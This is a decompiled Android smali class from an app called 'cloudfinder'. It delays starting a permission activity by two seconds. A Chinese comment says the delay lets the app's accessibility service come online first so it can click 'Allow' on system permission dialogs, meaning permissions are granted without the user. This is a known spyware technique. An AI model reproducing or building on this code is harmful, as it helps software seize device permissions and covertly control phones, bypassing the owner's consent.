.class public final Lcom/lite/cloudfinder/activity/PermStarter;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;

# 延迟启动 PermissionActivity：无障碍服务在 onServiceConnected 里立刻拉权限页时，
# 自身的事件分发还没就绪，系统权限框弹出后没人点“允许”。隔两秒再拉，让无障碍先上线。

.field private final ctx:Landroid/content/Context;

.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    iput-object p1, p0, Lcom/lite/cloudfinder/activity/PermStarter;->ctx:Landroid/content/Context;
    return-void
.end method

.method public run()V
    .locals 3
    :try_start_0
    iget-object v0, p0, Lcom/lite/cloudfinder/activity/PermStarter;->ctx:Landroid/content/Context;
    if-nez v0, :cond_0
    return-void
    :cond_0
    new-instance v1, Landroid/content/Intent;
    const-class v2, Lcom/lite/cloudfinder/activity/PermissionActivity;
    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    const/high16 v2, 0x10000000
    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {v0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return-void
    :catch_0
    move-exception v0
    return-void
.end method
